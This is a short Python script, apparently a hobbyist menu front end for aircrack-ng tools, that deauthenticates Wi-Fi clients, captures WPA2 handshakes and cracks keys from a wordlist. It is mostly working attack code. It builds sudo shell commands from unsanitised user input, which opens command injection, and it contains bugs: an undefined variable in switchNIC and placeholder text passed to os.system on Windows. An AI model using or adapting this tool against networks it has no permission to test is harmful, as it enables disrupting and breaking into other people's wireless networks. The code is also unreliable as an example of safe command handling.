#!/bin/python
import sys
import os

# This class contains state data used throughout the program
# This may need to move to its own file if it gets too large
class RuntimeData:
  def __init__(self, userNic, userChannel):
    self.userNic = userNic
    self.userChannel = userChannel

# Main script starts here
def main():
	# Check passed args
	if len(sys.argv) < 2:
		print("error: No wireless interface provided\n")
		usage()
		sys.exit(1)

	#TODO: Verify NIC actually exists before accepting
	userChannel = 1
	if len(sys.argv) > 2:
		userChannel = sys.argv[2]

	# Initialize loop
	runtimeData = RuntimeData(sys.argv[1], userChannel)
	print("Using channel " + str(runtimeData.userChannel) + " on " + runtimeData.userNic + "\n")
	inputLoop(runtimeData)

def usage():
	if sys.platform == "win32":
		print("usage: python " + __file__ + " <device name> [channel]\n")
	else:
		print("usage: ./" + __file__ + " <device name> [channel]\n")

def inputLoop(runtimeData):
	command = "-1"
	menu()
	while command == "-1":
		command = input("> ")
		
		if command == "1":
			#Fire aireplay-ng
			deauth(runtimeData)
			command = "-1"
		elif command == "2":
			#Fire airmon-ng
			setPromisc(runtimeData)
			command = "-1"
		elif command == "3":
			#Fire airodump-ng
			capture(runtimeData)
			command = "-1"
		elif command == "4":
			#Fire aircrack-ng
			crack(runtimeData)
			command = "-1"
		elif command == "5":
			#Fire airmon-ng
			listDevices(runtimeData)
			command = "-1"
		elif command == "6":
			switchNIC(runtimeData)
			command = "-1"
		elif command == "?":
			usage()
			command = "-1"
		else:
			menu()
			command = "-1"

	
def menu():
	print("1. Issue a deauthentication attack.")
	print("2. Set NIC to promiscous mode.")
	print("3. Capture an authentication packet.")
	print("4. Crack a WPA2 key.")
	print("5. List network interfaces.")
	print("6. Switch network interface")
	print("?  Usage")
	print("Enter one of the above commands:")

def deauth(runtimeData):
	#Aireplay command to send deauth packets
	bssid = input("Specify the BSSID of the wireless AP: ")
	target_mac = input("Specify the MAC address of the client you wish to deauthenticate: ")
	cmd = "sudo aireplay-ng -0 1 -a " + bssid + " -c " + target_mac + " " + runtimeData.userNic
	os.system(cmd)
	
def setPromisc(runtimeData):
	#Airmon command to set nic to promiscous
	if sys.platform == "win32":
		cmd = "idk how to escalate permissions in windows"
	else:
		cmd = "sudo airmon-ng start " + runtimeData.userNic
	os.system(cmd)

def listDevices(runtimeData):
	#Airmon command to list devices'
	if sys.platform == "win32":
		cmd = "idk how to escalate permissions in windows"
	else:
		cmd = "sudo airmon-ng"

	os.system(cmd)

def switchNIC(runtimeData):
	newNic = input("Enter NIC device name: ")
	if sys.platform == "win32":
		cmd = "idk how to escalate permissions in windows"
	else:
		cmd = "sudo airmon-ng stop " + runtimeData.userNic
	runtimeData.userNic = command
	os.system(cmd)
	
def capture(runtimeData):
	#Airodump command to capture authentication traffic
	bssid = input("Please specify a BSSID: ")
	cap_file = input("Please specify a capture file to save to: ")
	cmd = "sudo airodump-ng -c " + runtimeData.userChannel + " --bssid " + bssid + " -w " + cap_file + " " + runtimeData.userNic
	os.system(cmd)
	
def crack(runtimeData):
	#Aircrack command to crack the key in the traffic dump
	word_list = input("Please specify a wordlist file: ")
	bssid = input("Please specify a BSSID: ")
	cap_file = input("Please specify a capture file: ")
	cmd = "sudo aircrack-ng -w " + word_list + " -b " + bssid + " " + cap_file
	os.system(cmd)

if __name__ == '__main__':
    main()
 
